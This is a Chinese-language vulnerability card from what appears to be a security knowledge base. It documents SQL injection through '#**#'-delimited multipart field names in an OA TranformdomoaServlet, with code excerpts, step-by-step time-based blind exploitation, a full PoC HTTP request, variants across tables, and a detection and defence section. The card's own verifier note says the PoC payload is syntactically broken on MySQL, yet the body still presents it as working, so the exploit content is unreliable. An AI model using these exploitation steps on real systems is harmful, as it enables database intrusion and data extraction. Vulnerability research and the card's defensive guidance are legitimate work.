---
id: web-generic-sqli-oa-jsf-tranformdomoa-multipart-field-sqli
title: 'OA TranformdomoaServlet 按 #**# 拆分 multipart 字段名拼接 INSERT，时间盲注'
type: scenario
domain: web
path: web/generic/sqli
technique: multipart-fieldname-delimiter-insert-sqli
tags:
- sqli
- java
- servlet
- multipart
- insert-statement
- time-based-blind
- oa
- code-audit
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V59
  verified_at: '2026-11-05T09:03:37+08:00'
  notes: '已对照原文与54张图核对：图27 insertformitem 确实用 StringBuffer 拼接列名/值并 stat.execute；图29-30 字段名按 #**# 切分、S 类型值仅包单引号不转义；图50-52 入口与路由均与卡片一致，注入 sink 成立。问题：PoC 的 payload 按字面无法在 MySQL 成立——值被包成 ''Notice'') AND SLEEP(5); --'' 后拼出的 SQL 形如 values(''Notice'') AND SLEEP(5); --'', ''时间'', ''1'')；右括号已提前闭合 VALUES 元组，后续 AND 语法非法；且 MySQL 的 -- 注释要求第二个连字符后跟空白，--'' 不构成注释，无法注释掉后续右引号/列值。建议改为不提前闭合元组、用布尔条件收尾的 payload，例如 列#**#值'' AND SLEEP(5) AND ''1''=''1#**#S（列名/类型按目标表调整），并注明未实测。未验证点：未在真实目标执行；原文无版本/CVE；frontmatter 无 sources/source_url。'
url: /docs/web/generic/sqli/web-generic-sqli-oa-jsf-tranformdomoa-multipart-field-sqli/
draft: false
kb_aliases:
- TranformdomoaServlet SQL 注入
- insertformitem 注入
- '#**# 字段名注入'
- multipart 字段名 SQL 注入
- OA INSERT 拼接注入
- PubilcFuncions 注入
---

## 一句话结论

OA 的 `TranformdomoaServlet` 把 multipart 表单字段名按 `#**#` 拆成“列名/值/类型”，值只做单引号包裹、不做转义，随后 `PubilcFuncions.insertformitem` 用 `StringBuffer` 把列名和值拼进 `INSERT ... VALUES(...)` 并交给 `Statement.execute`；构造 `字段名=列#**#值' AND SLEEP(5); --#**#S` 即可时间盲注。

## 原理

- **入口与路由**：`TranformdomoaServlet` 在 `web.xml` 中映射为 `/.../TranformdomoaServlet/*`，`doPost` 负责建立数据库连接（`DriverManager.getConnection`），读取请求参数 `wjlx`，调用 `procesdata(request, wjlx)` 解析上传/表单，再调用 `insertformitem(conn, wjlx, itemtype, itemvalue)` 落库。
- **字段名承载三段数据**：`procesdata` 使用 commons-fileupload 的 `DiskFileItemFactory`/`ServletFileUpload` 解析请求；对每个 `isFormField()` 的 `FileItem`，取 `item.getFieldName()` 后按 `#**#` 切分：
  ```java
  String getpoststr = fileitem.getFieldName();
  String tenname  = getpoststr.substring(0, getpoststr.indexOf("#**#"));
  String tmpvalue = getpoststr.substring(getpoststr.indexOf("#**#") + 4,
                                        getpoststr.lastIndexOf("#**#"));
  String tmptype  = getpoststr.substring(getpoststr.lastIndexOf("#**#") + 4);
  ```
  也就是说，一个 form 字段的 `name` 属性里就包含了列名、值和类型，全部由客户端控制。
- **值只包裹不转义**：`sepformitem` 在类型为 `S` 时执行 `mivalue.put(siname, "'" + sivalue + "'")`，把值放进单引号，但没有把 `'`、`\`、`)` 等字符转义或参数化。`T` 类型走日期解析，解析失败时写入固定时间字符串，注入点主要在 `S` 类型。
- **SQL 拼接**：`PubilcFuncions.insertformitem` 遍历上一步的 Map：
  ```java
  sbname.append(key + ",");
  sbvalue.append(mvalueMap.get(key) + ",");
  ...
  String sinserall = "insert into oa_disp_file(" + sbname + "UPDATE_STATE)values("
                     + sbvalue + time + ...;
  stat.execute(sinserall, Statement.RETURN_GENERATED_KEYS);
  ```
  列名列表和值列表都是字符串拼接，`Statement.execute` 直接执行，没有 `PreparedStatement`。
- **分支选择**：`wjlx` 决定表名：`snddoc.nsf` → `oa_disp_file`，`rev.nsf` → `oa_receive_file`，`signfl.nsf` → `oa_receipt_report`，`seals.nsf` → `OA_SEAL_APPLY`。PoC 使用 `snddoc.nsf`。
- **注入构造**：值是 `'Notice') AND SLEEP(5); --'`。单引号闭合原值的左引号，`)` 闭合 `VALUES(`，`--` 注释掉后续的右引号和其余列值，MySQL 执行 `SLEEP(5)`，从响应时间判断注入成功。
- **为什么列名也值得关注**：`sbname` 来自 Map 的 key（即 `#**#` 前的字段名部分），同样未经转义拼进列名列表；虽然值位置更容易构造，审计时也应把列名列表视为可注入面。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `TranformdomoaServlet` 的 `/*` 映射。
- 请求可到达 `doPost`，且 `wjlx` 参数能选中一个 INSERT 分支（如 `snddoc.nsf`）。
- 应用数据库账号可执行 `INSERT`；时间盲注还要求数据库支持 `SLEEP()`（MySQL/MariaDB）或可替换为对应方言的延时函数。
- 目标未对 multipart 字段名中的 `#**#`、单引号、`)`、`--` 做过滤。

## 利用步骤

1. 确认 servlet 路由：访问 `/TranformdomoaServlet` 或任意 `/*` 前缀下的路径，观察是否进入 `doPost`。
2. 用 multipart 表单提交一个普通字段，`name` 按 `列名#**#值#**#S` 形式构造，确认业务有响应/入库行为。
3. 在值里加入单引号与注释符，构造 `列名#**#x') AND SLEEP(5); --#**#S`，观察响应是否延迟约 5 秒。
4. 若延迟生效，替换为布尔/时间盲注表达式逐字符提取数据；不同 `wjlx` 可切换目标表。
5. 也可先尝试报错注入（`extractvalue`/`updatexml`）确认回显，再决定盲注方式。

## PoC

最小时间盲注请求：

```http
POST /xxxx/TranformdomoaServlet?wjlx=snddoc.nsf&orgTag=001 HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExp666
Content-Length: <len>

------WebKitFormBoundaryExp666
Content-Disposition: form-data; name="SUBJECT#**#Notice') AND SLEEP(5); --#**#S"

dummy_value
------WebKitFormBoundaryExp666
Content-Disposition: form-data; name="fjnr"; filename="dummy.txt"
Content-Type: text/plain

123123
------WebKitFormBoundaryExp666--
```

说明：`SUBJECT` 是列名，`Notice') AND SLEEP(5); --` 是值，`S` 是类型；`fjnr` 文件字段用于让 `procesdata` 继续走文件处理分支。PoC 依据代码路径构造，未在真实目标执行；实际列名需替换为目标表中存在的列。

## 变体与关联

- **其他表分支**：把 `wjlx` 改为 `rev.nsf`、`signfl.nsf`、`seals.nsf`，可把同一注入原语打到 `oa_receive_file`、`oa_receipt_report`、`OA_SEAL_APPLY`。
- **类型分支**：`S` 类型直接包裹单引号，最适合注入；`T` 类型先做日期解析，失败后写入固定值，注入难度更高。
- **列名注入**：若目标对值做了额外过滤，可测试 `#**#` 前的列名部分，利用 `sbname` 的裸拼接改变列名列表结构。
- **同一 servlet 的其他 sink**：该入口还会调用 `sepgwfile` 处理上传文件（另见文件上传卡），以及 `sepyjitem`/`sepzitem` 等落库方法，可一并审计。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 拼接注入的通用形态）；[[web-generic-file-upload-oa-jsf-transferdata-attachfile-getfieldname-traversal]]（同一 OA 的上传分支）。

## 检测与防御

- **代码修复**：INSERT 使用 `PreparedStatement` 与 `?` 占位；列名必须来自固定枚举/白名单映射，不能取自请求；`#**#` 自定义分隔协议应改为结构化 JSON 并在服务端校验字段名与类型。
- **输入校验**：对字段名做白名单（列名枚举），对值按类型强制转换（数字、日期、字符串分别处理），拒绝包含 `'`、`)`、`--`、`/*`、`#` 等 SQL 元字符的字段名/值。
- **检测特征**：multipart 表单字段名中出现 `#**#`、单引号、`)`、`--`；同一接口响应时间异常（`SLEEP`/`BENCHMARK`）；数据库日志出现带注释符的 INSERT；`wjlx` 参数值与业务枚举不符。
- **加固**：数据库账号最小权限（仅 INSERT 必要表）；关闭 `Statement.execute` 的多语句执行；对 `TranformdomoaServlet` 增加鉴权并限制来源。
